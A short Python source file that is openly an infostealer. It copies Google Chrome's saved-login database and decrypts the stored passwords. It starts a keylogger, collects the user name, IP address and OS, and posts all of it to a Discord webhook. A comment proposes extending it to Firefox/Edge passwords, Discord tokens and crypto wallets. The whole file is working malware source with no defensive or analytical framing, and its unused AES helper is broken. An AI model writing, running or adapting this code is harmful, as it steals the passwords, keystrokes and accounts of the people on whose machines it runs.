import os, json, sqlite3, shutil, requests, base64, win32crypt, getpass, socket
from Crypto.Cipher import AES
from pynput import keyboard

WEBHOOK = "https://discord.com/api/webhooks/your_webhook_here"

# AES encryption helper
KEY = b'RandomSecretKey123'
def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data.ljust(32).encode())).decode()

# Chrome passwords
def get_chrome_passwords():
    path = os.environ['LOCALAPPDATA'] + r"\Google\Chrome\User Data\Default\Login Data"
    shutil.copy2(path, "LoginData.db")
    conn = sqlite3.connect("LoginData.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    creds = []
    for url, user, pwd in cursor.fetchall():
        try: pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
        except: pwd = ""
        creds.append(f"{url} | {user} | {pwd}")
    conn.close()
    os.remove("LoginData.db")
    return "\n".join(creds)

# Keylogger
keys = []
def on_press(key):
    try: keys.append(key.char)
    except: keys.append(str(key))
listener = keyboard.Listener(on_press=on_press)
listener.start()

# System info
def get_sysinfo():
    return f"User: {getpass.getuser()} | IP: {socket.gethostbyname(socket.gethostname())} | OS: {os.name}"

# Send data to Discord
def send_webhook(data):
    requests.post(WEBHOOK, json={"content": f"```{data}```"})

if __name__ == "__main__":
    info = get_sysinfo() + "\n\nPasswords:\n" + get_chrome_passwords()
    info += "\n\nKeylogger:\n" + "".join(keys)
    # Add: Firefox/Edge, Discord tokens, Crypto wallets here
    send_webhook(info)
